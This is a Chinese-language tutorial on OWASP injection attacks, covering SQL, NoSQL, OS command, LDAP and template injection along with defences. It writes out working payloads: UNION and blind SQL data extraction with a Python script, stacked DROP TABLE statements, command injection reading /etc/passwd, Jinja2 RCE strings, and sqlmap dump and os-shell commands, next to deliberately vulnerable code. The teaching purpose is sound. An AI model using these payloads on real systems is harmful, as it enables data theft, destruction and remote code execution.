A03:2021 - 注入攻击 (Injection)

CRITICAL 排名第3

注入攻击长期占据 OWASP Top 10。核心原因只有一句话：不可信数据被当作命令/查询的一部分解释执行。

1. 注入攻击的本质

一句话理解注入

程序把"用户输入的数据"和"程序的指令"混在一起，没有做区分。攻击者通过精心构造的输入，让自己的"数据"被当成"指令"执行。

注入的统一模型： 正常情况： 代码模板: "SELECT * FROM users WHERE name = '[用户输入]'" 用户输入: alice 最终执行: SELECT * FROM users WHERE name = 'alice' → 查询名为 alice 的用户 ✓ 注入攻击： 代码模板: "SELECT * FROM users WHERE name = '[用户输入]'" 用户输入: ' OR '1'='1 最终执行: SELECT * FROM users WHERE name = '' OR '1'='1' → 查询所有用户！因为 '1'='1' 永远为真！ 本质： 用户的输入"逃逸"出了数据的边界（引号），进入了指令区域 数据 → 指令 = 注入成功 这个模式适用于所有注入类型： SQL注入: 输入逃逸出SQL字符串 命令注入: 输入逃逸出shell参数 XSS: 输入逃逸出HTML文本，进入脚本区域 LDAP注入: 输入逃逸出LDAP过滤器 模板注入: 输入被模板引擎解释执行

2. SQL 注入详解

2.1 经典登录绕过

# 漏洞代码
def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = db.execute(query)
    return result.fetchone()

# 攻击输入
username: admin' --
password: anything

# 生成的SQL
SELECT * FROM users WHERE username='admin' --' AND password='anything'
                                           ↑
                                     注释符！后面全部忽略

# 等价于
SELECT * FROM users WHERE username='admin'
# → 无需密码即可登录 admin 账户！

2.2 SQL 注入类型概览

类型特征获取数据方式难度
UNION 注入页面直接显示查询结果UNION SELECT 拼接查询低
报错注入页面显示SQL错误信息利用错误信息泄露数据低
布尔盲注页面只有两种状态(有/无数据)逐位判断，通过页面变化推断中
时间盲注页面完全无差异通过响应延迟推断高
堆叠注入支持多语句执行执行任意SQL语句看后端
二次注入注入数据先存储再使用利用存储的恶意数据高

3. SQL 注入分类详解

3.1 UNION 注入

当应用直接在页面上显示数据库查询结果时，可以通过 UNION 拼接额外的查询，让结果一起显示出来。

# 目标URL: http://target.com/product?id=1
# 后端SQL: SELECT name, price FROM products WHERE id = [input]

# Step 1: 判断注入点
?id=1'          → 报错（存在注入）
?id=1 AND 1=1   → 正常
?id=1 AND 1=2   → 异常

# Step 2: 确定列数（UNION 要求两个 SELECT 列数相同）
?id=1 ORDER BY 1  → 正常
?id=1 ORDER BY 2  → 正常
?id=1 ORDER BY 3  → 报错 → 说明有2列

# Step 3: 确定显示位（哪几列的数据会在页面上显示）
?id=-1 UNION SELECT 1,2
# 页面显示 "1" 和 "2" 的位置就是回显位

# Step 4: 获取数据库信息
?id=-1 UNION SELECT version(), database()
# → 显示数据库版本和当前库名

# Step 5: 获取所有表名
?id=-1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()

# Step 6: 获取列名
?id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'

# Step 7: 获取数据
?id=-1 UNION SELECT username, password FROM users

3.2 报错注入

利用数据库的错误信息回显来获取数据。适用于页面显示 SQL 错误但不直接显示查询结果的场景。

# MySQL 报错注入常用函数

# extractvalue() - XML解析错误泄露数据
?id=1 AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))
# 错误信息: XPATH syntax error: '~target_db~'

# updatexml() - 同理
?id=1 AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)
# 错误信息: XPATH syntax error: '~root@localhost~'

# floor() + rand() - 经典报错注入
?id=1 AND (SELECT 1 FROM (SELECT count(*), concat((SELECT database()),
    floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
# 错误信息: Duplicate entry 'target_db1' for key 'group_key'

# 注意：报错注入一次只能获取有限长度的数据
# 需要用 SUBSTR() 分段获取长数据

3.3 布尔盲注

页面不显示数据也不显示错误，但根据查询条件真假会有两种不同的页面状态（如：有结果/无结果、不同文案等）。

# 原理：通过构造条件语句，根据页面变化逐位判断数据

# 判断数据库名第一个字符
?id=1 AND (SELECT ASCII(SUBSTR(database(),1,1))) > 100
# 页面正常 → 第一个字符ASCII > 100

?id=1 AND (SELECT ASCII(SUBSTR(database(),1,1))) > 110
# 页面异常 → 第一个字符ASCII ≤ 110

?id=1 AND (SELECT ASCII(SUBSTR(database(),1,1))) = 116
# 页面正常 → 第一个字符是 't' (ASCII 116)

# 自动化脚本（Python）
import requests

def blind_sqli(url, payload_template):
    result = ""
    for pos in range(1, 50):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = payload_template.format(pos=pos, mid=mid)
            resp = requests.get(url + payload)
            if "正常标识" in resp.text:  # 条件为真的判断
                low = mid + 1
            else:
                high = mid - 1
        if low > 126:
            break
        result += chr(low)
        print(f"[*] Found: {result}")
    return result

# 获取数据库名
url = "http://target.com/product?id=1"
payload = " AND ASCII(SUBSTR(database(),{pos},1))>{mid}"
db_name = blind_sqli(url, payload)

3.4 时间盲注

最极端的情况：页面完全无差异（无论注入条件真假，返回完全相同）。此时通过响应时间来判断。

# 原理：条件为真时让数据库延迟响应

# MySQL: IF(condition, SLEEP(5), 0)
?id=1 AND IF(ASCII(SUBSTR(database(),1,1))>100, SLEEP(5), 0)
# 如果第一个字符ASCII>100 → 响应延迟5秒
# 否则 → 立即响应

# PostgreSQL: CASE WHEN ... THEN pg_sleep(5)
?id=1; SELECT CASE WHEN (ASCII(SUBSTR(current_database(),1,1))>100)
    THEN pg_sleep(5) ELSE pg_sleep(0) END--

# SQL Server: WAITFOR DELAY
?id=1; IF ASCII(SUBSTRING(DB_NAME(),1,1))>100 WAITFOR DELAY '0:0:5'--

# 时间盲注的缺点：
# - 极慢（每一位都要等待延时）
# - 受网络波动影响
# - 通常用 sqlmap 自动化

3.5 堆叠注入

# 某些数据库/驱动允许用分号分隔多条SQL
?id=1; DROP TABLE users; --
?id=1; INSERT INTO users(username,password,role) VALUES('hacker','pwd','admin'); --

# 注意：
# - MySQL + PHP(mysqli_query): 默认不支持堆叠
# - MySQL + PHP(PDO): 可能支持
# - PostgreSQL: 通常支持
# - SQL Server: 通常支持
# - SQLite: 通常支持

3.6 二次注入（Second Order Injection）

二次注入流程： Step 1: 注册用户名为恶意payload 注册: username = admin'-- 存入数据库时正确转义了，安全存储 Step 2: 修改密码功能 后端SQL: UPDATE users SET password='新密码' WHERE username='[从数据库读取的用户名]' ↑ 开发者认为"数据库里的数据是安全的"，没有再次转义 Step 3: 实际执行 UPDATE users SET password='hacker123' WHERE username='admin'--' → 修改了 admin 的密码！ 关键： - 第一次输入时被正确转义了（不能直接注入） - 但数据从数据库读出后被二次使用时没有转义 - 信任了"来自数据库的数据" = 错误的信任边界

4.3 sqlmap 使用指南

# sqlmap 是最强大的自动化SQL注入工具

# 基础检测
sqlmap -u "http://target.com/page?id=1" --batch

# 指定注入参数
sqlmap -u "http://target.com/page" --data="username=admin&password=test" -p username

# 获取数据库信息
sqlmap -u "http://target.com/page?id=1" --dbs          # 所有数据库

sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns  # 列
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump     # 数据

# 高级选项
sqlmap -u "..." --level=5 --risk=3     # 最高检测级别
sqlmap -u "..." --tamper=space2comment  # 使用绕过脚本
sqlmap -u "..." --os-shell             # 尝试获取系统shell
sqlmap -u "..." --technique=T          # 只用时间盲注

# 使用Cookie/Header
sqlmap -u "..." --cookie="session=abc" --headers="X-Token: xyz"

# 通过Burp代理的请求文件
sqlmap -r request.txt --batch

5. NoSQL 注入

NoSQL 数据库（MongoDB、Redis 等）虽然不用 SQL，但同样存在注入风险。

5.1 MongoDB 注入

// 漏洞代码（Node.js + MongoDB）
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    // 直接将用户输入放入查询
    const user = await db.collection('users').findOne({
        username: username,
        password: password
    });
    if (user) res.json({success: true});
});

// 攻击请求 - JSON 注入操作符
POST /login
Content-Type: application/json
{
    "username": "admin",
    "password": {"$ne": ""}  // $ne = not equal，永远为真！
}

// 等价查询：找 username=admin 且 password 不等于空字符串的用户
// → 只要admin存在且密码非空，就能登录！

// 其他 MongoDB 操作符攻击
{"username": {"$gt": ""}}      // 大于空字符串 = 匹配所有
{"username": {"$regex": "^a"}} // 正则匹配，可逐字符猜测
{"$where": "this.password.length > 0"}  // JavaScript注入！

5.2 防御 NoSQL 注入

// ✅ 类型验证 - 确保输入是字符串而非对象
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // 强制类型检查
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({error: 'Invalid input'});
    }

    // 使用 sanitize 库过滤操作符
    const sanitizedUser = sanitize(username);
    const sanitizedPass = sanitize(password);

    const user = await db.collection('users').findOne({
        username: sanitizedUser,
        password: sanitizedPass  // 实际应该比较哈希
    });
});

6. OS 命令注入

当应用将用户输入拼接到系统命令中执行时，攻击者可以注入额外的系统命令。

6.1 命令注入原理

# 漏洞代码 - Python
import os

def ping_host(ip):
    # 用户输入直接拼接到命令中
    result = os.system(f"ping -c 4 {ip}")
    return result

# 正常使用
ping_host("192.168.1.1")
# 执行: ping -c 4 192.168.1.1

# 攻击输入
ping_host("192.168.1.1; cat /etc/passwd")
# 执行: ping -c 4 192.168.1.1; cat /etc/passwd
#        ↑正常命令              ↑注入的命令

# 攻击输入 - 其他分隔符
ping_host("192.168.1.1 && whoami")       # AND 连接
ping_host("192.168.1.1 || whoami")       # OR 连接
ping_host("192.168.1.1 | whoami")        # 管道
ping_host("$(whoami)")                    # 命令替换
ping_host("`whoami`")                     # 反引号命令替换

6.2 Shell 元字符

字符作用示例
;命令分隔（顺序执行）cmd1; cmd2
&&逻辑AND（前者成功才执行后者）cmd1 && cmd2
||逻辑OR（前者失败才执行后者）cmd1 || cmd2
|管道（前者输出作为后者输入）cmd1 | cmd2
$()命令替换echo $(whoami)
` `命令替换（旧语法）echo `id`
>输出重定向cmd > /tmp/out
<输入重定向cmd < /etc/passwd
\n换行（新命令）URL编码: %0a

6.3 命令注入防御

# ✅ 方案1：使用参数化API，避免调用shell
import subprocess

def ping_host_safe(ip):
    # 使用列表传参，不经过shell解释
    try:
        result = subprocess.run(
            ['ping', '-c', '4', ip],  # 参数列表，不会被shell解释
            capture_output=True, text=True,
            timeout=10,
            shell=False  # 关键！不通过shell
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Timeout"

# ✅ 方案2：严格输入验证
import re

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        raise ValueError("Invalid IP format")
    parts = ip.split('.')
    if not all(0 <= int(p) <= 255 for p in parts):
        raise ValueError("Invalid IP range")
    return ip

# ✅ 方案3：白名单
ALLOWED_COMMANDS = {'status', 'info', 'version'}
def run_diagnostic(command):
    if command not in ALLOWED_COMMANDS:
        raise ValueError("Command not allowed")
    return subprocess.run(['diagnostic', command], capture_output=True)

7. LDAP 注入

LDAP（轻量目录访问协议）常用于企业用户认证和目录查询。LDAP 过滤器的语法如果不正确处理用户输入，会导致注入。

# LDAP 过滤器语法
# (&(attribute=value)(attribute2=value2))  AND
# (|(attribute=value)(attribute2=value2))  OR
# (!(attribute=value))                     NOT

# 漏洞代码
def ldap_login(username, password):
    filter = f"(&(uid={username})(userPassword={password}))"
    result = ldap_conn.search(base_dn, filter)
    return result

# 攻击：username = *)(uid=*))(|(uid=*
# 生成: (&(uid=*)(uid=*))(|(uid=*)(userPassword=xxx))
# → 匹配所有用户！

# 常见 LDAP 注入 payload
# *         → 通配符，匹配所有
# *)(&      → 闭合括号，注入新条件
# *)(|(password=*) → 泄露属性

# 防御：转义 LDAP 特殊字符
import ldap

def sanitize_ldap(input_str):
    """转义 LDAP 特殊字符"""
    special_chars = {'\\': '\\5c', '*': '\\2a', '(': '\\28',
                     ')': '\\29', '\x00': '\\00'}
    for char, escape in special_chars.items():
        input_str = input_str.replace(char, escape)
    return input_str

8. SSTI - 服务端模板注入

当用户输入被直接嵌入到服务端模板引擎中渲染时，攻击者可以注入模板语法执行任意代码。

8.1 模板注入原理

# 漏洞代码 (Python Flask + Jinja2)
from flask import Flask, request, render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # ❌ 将用户输入直接作为模板渲染
    template = f"Hello {name}!"
    return render_template_string(template)

# 正常请求: /greet?name=Alice → "Hello Alice!"

# 攻击请求: /greet?name={{7*7}}
# → "Hello 49!"  （模板表达式被执行了！）

# 进一步利用 - 执行系统命令 (Jinja2)
/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# → "Hello uid=33(www-data)..."

# Jinja2 RCE Payload（经典）
{{''.__class__.__mro__[1].__subclasses__()[X]('命令',shell=True,stdout=-1).communicate()}}

8.2 SSTI 检测方法

SSTI 检测决策树： 输入: ${7*7} ↓ 页面显示 49 ? → 是 → 可能是 EL/Freemarker/Thymeleaf ↓ 否 输入: {{7*7}} ↓ 页面显示 49 ? → 是 → 可能是 Jinja2/Twig/Nunjucks ↓ 否 输入: #{7*7} ↓ 页面显示 49 ? → 是 → 可能是 Ruby ERB / Thymeleaf ↓ 否 输入: {{7*'7'}} ↓ 页面显示 7777777 ? → 是 → Jinja2（Python，字符串重复） 页面显示 49 ? → 是 → Twig（PHP） 工具: tplmap（自动检测和利用SSTI） python tplmap.py -u "http://target.com/page?name=*"

9. 注入攻击通用防御

防御核心原则：数据与指令分离

让数据永远是数据，指令永远是指令。两者绝不混合。

9.1 防御方法优先级

优先级方法原理适用
1 (最高)参数化查询/预编译数据和指令在协议层面分离SQL
2安全API使用不调用解释器的APIOS命令, LDAP
3输入验证(白名单)只允许已知安全的输入格式所有类型
4输出转义对特殊字符进行转义兜底防御
5 (兜底)最小权限即使被注入，降低危害所有类型

9.2 参数化查询示例（各语言）

# Python (SQLite3 / MySQL / PostgreSQL)
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?",
               (username, password))

# Python (SQLAlchemy ORM)
user = User.query.filter_by(username=username).first()

# Java (PreparedStatement)
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?");
ps.setString(1, username);
ps.setString(2, password);

# PHP (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
$stmt->execute(['user' => $username, 'pass' => $password]);

# Node.js (mysql2)
const [rows] = await connection.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
);

# Go (database/sql)
row := db.QueryRow("SELECT * FROM users WHERE username = $1 AND password = $2",
    username, password)

9.3 最小权限原则（数据库层面）

-- 应用使用的数据库账户应该有最小权限
-- ❌ 不要用 root/sa 连接
-- ✅ 创建专用账户，只给必要权限

CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';
GRANT SELECT ON myapp.products TO 'webapp'@'localhost';
-- 不给 DELETE, DROP, FILE, EXECUTE 等危险权限

-- 即使被SQL注入：
-- - 不能 DROP TABLE（没权限）
-- - 不能 LOAD_FILE 读文件（没 FILE 权限）
-- - 不能访问其他数据库（只授权了 myapp 库）
